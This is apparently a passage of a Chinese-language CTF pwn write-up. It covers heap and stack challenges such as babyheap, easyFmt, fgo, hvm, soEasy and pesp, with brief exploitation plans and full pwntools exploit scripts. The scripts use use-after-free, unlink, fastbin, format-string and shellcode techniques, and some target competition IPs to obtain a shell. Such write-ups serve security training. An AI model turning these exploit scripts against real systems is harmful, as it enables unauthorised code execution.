+<p><img src="https://i.loli.net/2018/08/30/5b88018860868.png" alt="babyheap1.png"></p>
+</li>
+<li><p>限制条件</p>
+<ul>
+<li><p>申请堆大小固定为0x20，且最多为10个</p>
+<p><img src="https://i.loli.net/2018/08/30/5b88018815f0b.png" alt="babyheap2.png"></p>
+</li>
+<li><p>只能编辑内容三次</p>
+<p><img src="https://i.loli.net/2018/08/30/5b880187d35f5.png" alt="babyheap3.png"></p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>利用思路</p>
+<ul>
+<li><p>1.通过uaf leak 堆地址</p>
+</li>
+<li><p>2.修改fd指向自身内部伪造的chunk造成overlap</p>
+</li>
+<li><p>3.利用overlap修该下一个堆块的size，释放得到unsortbin，leak libc地址</p>
+</li>
+<li><p>4.再次修改unsortbin中的chunk大小为0x20，再次申请堆，得到smallbin</p>
+</li>
+<li><p>5.修改fd 和 bk，触发unlink，使bss段的列表指针只想自身，达到任意写</p>
+</li>
+<li><p>6.修改free hook ，getshell</p>
+</li>
+<li><p>tip：能用overlap修改数据的就尽量不用uaf修改</p>
+</li>
+</ul>
+</li>
+</ul>
+<p>exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'sp'</span>,<span class="string">'-h'</span>,<span class="string">'-l'</span>,<span class="string">'105'</span>]</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">r = <span class="keyword">lambda</span> x:p.recv(x)</span><br><span class="line">rl = <span class="keyword">lambda</span>:p.recvline</span><br><span class="line">ru = <span class="keyword">lambda</span> x:p.recvuntil(x)</span><br><span class="line">rud = <span class="keyword">lambda</span> x:p.recvuntil(x,drop=<span class="keyword">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x:p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x:p.sendline(x)</span><br><span class="line">sla = <span class="keyword">lambda</span> x,y:p.sendlineafter(x,y)</span><br><span class="line">sa = <span class="keyword">lambda</span> x,y:p.sendafter(x,y)</span><br><span class="line">rn = <span class="keyword">lambda</span> x:p.recvn(x)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hint</span><span class="params">()</span>:</span></span><br><span class="line">  <span class="keyword">print</span> <span class="string">'pidof is %s '</span> % pidof(p)</span><br><span class="line">  raw_input(<span class="string">'waiting for debug'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">makep</span><span class="params">(ip=<span class="string">''</span>,port=<span class="number">0</span>,binary=<span class="string">''</span>)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> p</span><br><span class="line">    p = process(binary)</span><br><span class="line">    <span class="keyword">if</span> ip <span class="keyword">and</span> port:</span><br><span class="line">        p = remote(ip,port)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(idx,cont)</span>:</span></span><br><span class="line">    sla(<span class="string">":"</span>,<span class="string">"1"</span>)</span><br><span class="line">    sla(<span class="string">":"</span>,str(idx))</span><br><span class="line">    sa(<span class="string">":"</span>,cont)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,cont)</span>:</span></span><br><span class="line">    sla(<span class="string">"Choice:"</span>,<span class="string">"2"</span>)</span><br><span class="line">    sla(<span class="string">":"</span>,str(idx))</span><br><span class="line">    sla(<span class="string">":"</span>,cont)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sla(<span class="string">":"</span>,<span class="string">"4"</span>)</span><br><span class="line">    sla(<span class="string">":"</span>,str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sla(<span class="string">":"</span>,<span class="string">"3"</span>)</span><br><span class="line">    sla(<span class="string">":"</span>,str(idx))</span><br><span class="line">    data = ru(<span class="string">'\n'</span>)[:<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">()</span>:</span></span><br><span class="line">    makep(binary=<span class="string">'./babyheap'</span>)</span><br><span class="line">    create(<span class="number">0</span>,<span class="string">'A'</span>*<span class="number">8</span>+p64(<span class="number">0x31</span>)+<span class="string">'\n'</span>)</span><br><span class="line">    create(<span class="number">1</span>,<span class="string">'B'</span>*<span class="number">8</span>+p64(<span class="number">0x31</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x41</span>))</span><br><span class="line">    create(<span class="number">2</span>,<span class="string">'C'</span>*<span class="number">8</span>+<span class="string">'\n'</span>)</span><br><span class="line">    create(<span class="number">3</span>,<span class="string">'D'</span>*<span class="number">8</span>+p64(<span class="number">0x21</span>)*<span class="number">2</span>+p64(<span class="number">0x21</span>))</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    data =  leak(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">print</span> data </span><br><span class="line">    heap = u64(data.ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-0x30</span></span><br><span class="line">    edit(<span class="number">0</span>,p64(heap+<span class="number">0x10</span>)+p64(<span class="number">0x31</span>)+p64(<span class="number">0</span>))<span class="comment">#0</span></span><br><span class="line">    create(<span class="number">4</span>,<span class="string">'E'</span>*<span class="number">6</span>+<span class="string">'\n'</span>)</span><br><span class="line">    create(<span class="number">5</span>,<span class="string">'F'</span>*<span class="number">0x10</span>+p64(<span class="number">0x20</span>)+p64(<span class="number">0x90</span>))</span><br><span class="line">    <span class="comment">#edit(0,'A'*8+p64(0x91))</span></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    create(<span class="number">6</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>)+<span class="string">'\n'</span>)</span><br><span class="line">    free(<span class="number">5</span>)</span><br><span class="line">    data = leak(<span class="number">5</span>)</span><br><span class="line">    <span class="keyword">print</span> data</span><br><span class="line">    libc = u64(data.ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0x3c4b78</span></span><br><span class="line">    success(<span class="string">"libc is "</span> +hex(libc))</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    create(<span class="number">9</span>,<span class="string">'/bin/sh\x00'</span>+p64(<span class="number">0x21</span>)+p64(libc+<span class="number">0x3c4b78</span>)[:<span class="number">7</span>]+<span class="string">'\n'</span>)<span class="comment">#1</span></span><br><span class="line">    payload = p64(<span class="number">0x602080</span><span class="number">-0x18</span>) +p64(<span class="number">0x602080</span><span class="number">-0x10</span>)  </span><br><span class="line">    create(<span class="number">7</span>,<span class="string">'S'</span>*<span class="number">8</span>+<span class="string">'\n'</span>)</span><br><span class="line">    hint()</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    create(<span class="number">8</span>,<span class="string">'/bin/sh\x00'</span>+p64(<span class="number">0x21</span>)+payload)</span><br><span class="line">    free_hook = libc +  <span class="number">0x3c67a8</span></span><br><span class="line">    system = <span class="number">0x45390</span> + libc</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    edit(<span class="number">4</span>,p64(free_hook)*<span class="number">3</span>)</span><br><span class="line">    edit(<span class="number">1</span>,p64(system))</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">pwn()</span><br></pre></td></tr></table></figure>
+<h1 id="easyFmt"><a href="#easyFmt" class="headerlink" title="easyFmt"></a>easyFmt</h1><ul>
+<li><p>简单的格式化字符串利用</p>
+</li>
+<li><p>exp</p>
+</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(<span class="string">'./pwn'</span>)</span><br><span class="line">    libc = ELF(<span class="string">'/lib32/libc-2.23.so'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'106.75.126.184'</span> , <span class="number">58579</span>)<span class="comment">#nc 106.75.126.184 58579</span></span><br><span class="line">    libc = ELF(<span class="string">'/lib32/libc-2.23.so'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./pwn'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Do you know repeater?\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'%35$p'</span>)</span><br><span class="line">libc.address = int(p.recv().strip(<span class="string">'\n'</span>) , <span class="number">16</span>) - libc.symbols[<span class="string">'__libc_start_main'</span>] - <span class="number">247</span></span><br><span class="line">success(<span class="string">'libc_base =&gt; '</span> + hex(libc.address))</span><br><span class="line">system_addr = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">success(<span class="string">'system_addr =&gt; '</span> + hex(system_addr))</span><br><span class="line">printf_got = elf.got[<span class="string">'printf'</span>]</span><br><span class="line">success(<span class="string">'printf_got =&gt; '</span> + hex(printf_got))</span><br><span class="line">payload = fmtstr_payload(<span class="number">6</span> , &#123;printf_got : system_addr&#125;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment">#sleep(1)</span></span><br><span class="line">p.sendline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h1 id="fgo"><a href="#fgo" class="headerlink" title="fgo"></a>fgo</h1><ul>
+<li><p>简单的double free</p>
+</li>
+<li><p>exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'sp'</span>,<span class="string">'-h'</span>,<span class="string">'-l'</span>,<span class="string">'105'</span>]</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">r = <span class="keyword">lambda</span> x:p.recv(x)</span><br><span class="line">rl = <span class="keyword">lambda</span>:p.recvline</span><br><span class="line">ru = <span class="keyword">lambda</span> x:p.recvuntil(x)</span><br><span class="line">rud = <span class="keyword">lambda</span> x:p.recvuntil(x,drop=<span class="keyword">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x:p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x:p.sendline(x)</span><br><span class="line">sla = <span class="keyword">lambda</span> x,y:p.sendlineafter(x,y)</span><br><span class="line">rn = <span class="keyword">lambda</span> x:p.recvn(x)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hint</span><span class="params">()</span>:</span></span><br><span class="line">  <span class="keyword">print</span> <span class="string">'pidof is %s '</span> % pidof(p)</span><br><span class="line">  raw_input(<span class="string">'waiting for debug'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">makep</span><span class="params">(ip=<span class="string">''</span>,port=<span class="number">0</span>,binary=<span class="string">''</span>)</span>:</span></span><br><span class="line">  <span class="keyword">global</span> p</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addu</span><span class="params">(size ,name)</span>:</span></span><br><span class="line">    sla(<span class="string">":"</span>,<span class="string">'1'</span>)</span><br><span class="line">    sla(<span class="string">":"</span>,str(size))</span><br><span class="line">    sla(<span class="string">":"</span>,name)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delu</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sla(<span class="string">":"</span>,<span class="string">'2'</span>)</span><br><span class="line">    sla(<span class="string">":"</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">global</span> p</span><br><span class="line">p = process(<span class="string">"./pwn"</span>)</span><br><span class="line">addu(<span class="number">8</span>,<span class="string">'A'</span>*<span class="number">7</span>)</span><br><span class="line">delu(<span class="number">0</span>)</span><br><span class="line">delu(<span class="number">0</span>)</span><br><span class="line">addu(<span class="number">100</span>,<span class="string">'A'</span>*<span class="number">100</span>)</span><br><span class="line">addu(<span class="number">8</span>,p32(<span class="number">0x08048956</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h1 id="hvm"><a href="#hvm" class="headerlink" title="hvm"></a>hvm</h1><ul>
+<li><p>题目</p>
+<ul>
+<li>题目给了一个hvm elf文件和一个hvmbin的数据文件</li>
+<li>程序实现了一个一个虚拟机，虚拟机的各寄存器为全局量</li>
+<li>程序运行时会mmap两块区域，一块为code段，一块为stack</li>
+<li>程序功能为输入串，打印hello str</li>
+</ul>
+</li>
+<li><p>漏洞位置</p>
+<ul>
+<li>输入超长串后会seg fault 栈溢出</li>
+</ul>
+</li>
+<li><p>漏洞利用</p>
+<ul>
+<li>一直很怵虚拟机这类的东西</li>
+<li>这次的题目设计得比较简单，基本逆向清楚了</li>
+<li>存在syscall，构造好寄存器就能getshell</li>
+<li>最后的rop构造时遇到了一些困难</li>
+<li>比赛时没有时间完成，赛后参考了别人的终于完成</li>
+</ul>
+</li>
+<li><p>exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">p = process(<span class="string">"./hvm"</span>)</span><br><span class="line">payload = <span class="string">'A'</span>*<span class="number">52</span> + p32(<span class="number">0xfdfbffff</span>) + <span class="string">'/bin/sh\x00'</span>+ p32(<span class="number">0x000001</span>) + p32(<span class="number">0x3b000000</span>) </span><br><span class="line">payload += p32(<span class="number">0x0000004</span>) + p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(<span class="number">0x000000d</span>) +p32(<span class="number">0x000001a</span>)</span><br><span class="line">payload +=  p32(<span class="number">0</span>)+p32(<span class="number">0x000000e</span>)</span><br><span class="line"><span class="keyword">print</span> pidof(p)</span><br><span class="line">raw_input()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h2 id="soEasy"><a href="#soEasy" class="headerlink" title="soEasy"></a>soEasy</h2><ul>
+<li><p>题目叫soeasy，应该不难，运行起来给了一个奇怪的地址，输出超长字符串直接报错，目测战溢出。</p>
+<p><img src="https://i.loli.net/2018/08/28/5b84ccd988e0b.png" alt=""></p>
+</li>
+</ul>
+<ul>
+<li>gdb 运行，生成pattern，确定偏移为76，发现上面地址为栈地址，没有开nx，直接扔shellcode。</li>
+</ul>
+<p>  <img src="https://i.loli.net/2018/08/28/5b84d1ea90ae2.png" alt=""></p>
+<ul>
+<li><p>最终脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level =<span class="string">'debug'</span></span><br><span class="line">p =remote(<span class="string">"106.75.95.47"</span> ,<span class="number">42264</span>)</span><br><span class="line"><span class="comment">#p = process("./pwn")</span></span><br><span class="line">p.recvuntil(<span class="string">"-&gt;"</span>)</span><br><span class="line">stack = int(p.recvuntil(<span class="string">'\n'</span>)[:<span class="number">-1</span>],<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"stack is "</span> + hex(stack)</span><br><span class="line">sh = asm(shellcraft.sh())</span><br><span class="line">sh += (<span class="number">76</span>-len(sh))*<span class="string">'A'</span> + p32(stack)</span><br><span class="line">p.recvuntil(<span class="string">"what do you want to do?"</span>)</span><br><span class="line">p.sendline(sh)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h2 id="pesp"><a href="#pesp" class="headerlink" title="pesp"></a>pesp</h2><ul>
+<li><p>正常选单题目，开正常保护。</p>
+<p><img src="https://i.loli.net/2018/08/28/5b84cffce8fe4.png" alt=""></p>
+</li>
+</ul>
+<ul>
+<li>在change_item 出存在堆溢出，堆申请大小可控，可以直接做fastbin attack。</li>
+</ul>
+<p><img src="https://i.loli.net/2018/08/28/5b84d085a2fbb.png" alt=""></p>
+<ul>
+<li><p>发现有个secret函数，很开心。。。。。。。。。。</p>
+<p><img src="https://i.loli.net/2018/08/28/5b84d0e2be53a.png" alt=""></p>
+</li>
+</ul>
+<ul>
+<li><p>劫持程序流过去就打印一个假的flag。。。。。。。。</p>
+</li>
+<li><p>直接写got因为pattern对齐会破坏之后的函数调用，所以利用修改bss的堆指针，达到任意写</p>
+</li>
+<li><p>最终脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'sp'</span>,<span class="string">'-h'</span>,<span class="string">'-l'</span>,<span class="string">'105'</span>]</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">r = <span class="keyword">lambda</span> x:p.recv(x)</span><br><span class="line">rl = <span class="keyword">lambda</span>:p.recvline</span><br><span class="line">ru = <span class="keyword">lambda</span> x:p.recvuntil(x)</span><br><span class="line">rud = <span class="keyword">lambda</span> x:p.recvuntil(x,drop=<span class="keyword">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x:p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x:p.sendline(x)</span><br><span class="line">sla = <span class="keyword">lambda</span> x,y:p.sendlineafter(x,y)</span><br><span class="line">sa = <span class="keyword">lambda</span> x,y:p.sendafter(x,y)</span><br><span class="line">rn = <span class="keyword">lambda</span> x:p.recvn(x)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hint</span><span class="params">()</span>:</span></span><br><span class="line">  <span class="keyword">print</span> <span class="string">'pidof is %s '</span> % pidof(p)</span><br><span class="line">  raw_input(<span class="string">'waiting for debug'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">makep</span><span class="params">(ip=<span class="string">''</span>,port=<span class="number">0</span>,binary=<span class="string">''</span>)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> p</span><br><span class="line">    <span class="keyword">if</span> ip <span class="keyword">and</span> port:</span><br><span class="line">        p = remote(ip,port)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p = process(binary)</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size, name)</span>:</span></span><br><span class="line">    sla(<span class="string">":"</span>,<span class="string">'2'</span>)</span><br><span class="line">    sla(<span class="string">":"</span>,str(size))</span><br><span class="line">    sla(<span class="string">":"</span>,name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(size,idx, name)</span>:</span></span><br><span class="line">    sla(<span class="string">":"</span>,<span class="string">'3'</span>)</span><br><span class="line">    sla(<span class="string">" index of servant:"</span>,str(idx))</span><br><span class="line">    sla(<span class="string">":"</span>,str(size))</span><br><span class="line">    sa(<span class="string">":"</span>,name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sla(<span class="string">":"</span>,<span class="string">'4'</span>)</span><br><span class="line">    sla(<span class="string">":"</span>,str(idx))</span><br><span class="line"></span><br><span class="line">secret = <span class="number">0x400d49</span></span><br><span class="line">libc = ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">()</span>:</span></span><br><span class="line">    makep( ip = <span class="string">'106.75.27.104'</span>, port = <span class="number">50514</span>)</span><br><span class="line">    <span class="comment">#makep(binary='./pwn')</span></span><br><span class="line">    add(<span class="number">0x60</span>,<span class="string">'A'</span>*<span class="number">0x20</span>)</span><br><span class="line">    add(<span class="number">0x60</span>,<span class="string">'B'</span>*<span class="number">0x20</span>)</span><br><span class="line">    add(<span class="number">0x60</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">    remove(<span class="number">1</span>)</span><br><span class="line">    change(<span class="number">0x100</span>,<span class="number">0</span>,<span class="string">'A'</span>*<span class="number">0x60</span>+ p64(<span class="number">0</span>)+ p64(<span class="number">0x71</span>) + p64(<span class="number">0x6020ad</span>) + <span class="string">'\n'</span>)</span><br><span class="line">    add(<span class="number">0x60</span>,<span class="string">'A'</span>*<span class="number">20</span>)</span><br><span class="line">    add(<span class="number">0x60</span>,<span class="string">'B'</span>*<span class="number">3</span>+p64(<span class="number">0x100</span>)+p64(<span class="number">0x602018</span>)*<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">":"</span>,<span class="string">'1'</span>)</span><br><span class="line">    data = ru(<span class="string">"0 : "</span>)</span><br><span class="line">    data = rn(<span class="number">6</span>)</span><br><span class="line">    libc.address = u64(data.ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - libc.symbols[<span class="string">'free'</span>]</span><br><span class="line">    system = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    one = libc.address  + <span class="number">0xf1147</span></span><br><span class="line">    <span class="keyword">print</span> hex(libc.address) </span><br><span class="line">    change(<span class="number">0x20</span>,<span class="number">0</span>,p64(system)+ p64(libc.symbols[<span class="string">'puts'</span>]) + <span class="string">'\n'</span>)</span><br><span class="line">    remove(<span class="number">2</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">pwn()</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h2 id="note"><a href="#note" class="headerlink" title="note"></a>note</h2><ul>
+<li>拿到题目名字叫deathnote，一瞬间想起pwnable,尝试输入负数下标志，失败。</li>
+</ul>
+<p><img src="https://i.loli.net/2018/08/28/5b84d25676e85.png" alt=""></p>
+<ul>
+<li><p>ida打开，发现没有用atoi，而是自己的函数转换数字。</p>
+<p><img src="https://i.loli.net/2018/08/28/5b84d2a8a3c6a.png" alt=""></p>
+</li>
+<li><p>输入-10 ，存在相同和alivenote相同漏洞，然而八字节变成了四字节</p>
+</li>
+</ul>
+<p><img src="https://i.loli.net/2018/08/28/5b84d31b82ef2.png" alt=""></p>
+<p><img src="https://i.loli.net/2018/08/28/5b84d39ac8267.png" alt=""></p>
+<ul>
+<li><p>上次写这种shellcode的过程相当痛苦，决定找其他方法做。作者自己实现的堆申请和释放函数。</p>
+</li>
+<li><p>malloc </p>
+<p><img src="https://i.loli.net/2018/08/28/5b84d46c51739.png" alt=""></p>
+</li>
+<li><p>free</p>
+</li>
+</ul>
+<p><img src="https://i.loli.net/2018/08/28/5b84d46c44f59.png" alt=""></p>
+<ul>
+<li>发现data区域有指向自己的指针可以任意读写code空间，成功leak libc地址，距离成功一大半。</li>
+</ul>
+<p><img src="https://i.loli.net/2018/08/28/5b84d40fad5f7.png" alt=""></p>
+<ul>
+<li>最后发现，还是需要写shellcode，由于每次只能输入4byte，无法修改高四位指针。卒！！！！</li>
+</ul>
+<h1 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a>impossible</h1><ul>
+<li>程序提供四个选项功能<ul>
+<li>选项一read输入，将输入的数据用puts打印，只能进入一次</li>
+<li>选项二输入超长串到bss段，可以选择递归调用，可以进入多次</li>
+<li>选项三输入2bytes，printf打印，可以进入多次</li>
+<li>选项9011，打开/dev/random 读入8bytes，如果输入与读入字节相同，则拷贝bss段超长串存在栈溢出，不同则直接退出函数，可以多次进入</li>
+</ul>
+</li>
+<li>漏洞利用<ul>
+<li>偶然尝试%a打印浮点数时会判断出错，可以leak出libc地址</li>
+<li>通过多次调用boring，在栈的低位放置canary ，利用选项一puts leak出canary</li>
+<li>耗尽fd，read不出数据后，就可以通过secret比较，栈溢出rop</li>
+<li>因为close(0)，所以通过直接调用system（cmd）的方式执行命令</li>
+</ul>
+</li>
+</ul>
